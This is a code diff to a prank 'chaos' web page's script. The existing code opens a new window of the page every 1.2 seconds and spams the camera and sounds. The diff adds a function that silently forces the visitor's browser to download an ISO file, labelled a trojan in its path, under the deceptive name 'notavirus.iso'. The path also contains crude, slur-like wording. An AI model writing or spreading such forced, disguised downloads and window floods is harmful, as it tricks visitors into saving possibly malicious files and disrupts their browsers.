@@ -54,6 +54,7 @@ function unleashChaos() {
   startCameraSpam();
   startGifBoxes();
   startSelfClones();
+  triggerDownload();
 }
 function startSounds() {
   const urls = [
@@ -110,6 +111,14 @@ function startSelfClones() {
     if (!chaosActive) return;
     window.open('./index.html', '_blank', 'width=800,height=600');
   }, 1200);
+}
+ function triggerDownload() {
+  const a = document.createElement('a');
+  a.href = './audio/notavirustrojanpenisfniga.iso';
+  a.download = 'notavirus.iso';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
 }
 document.getElementById('entry-screen').onclick = unleashChaos;
 </script>
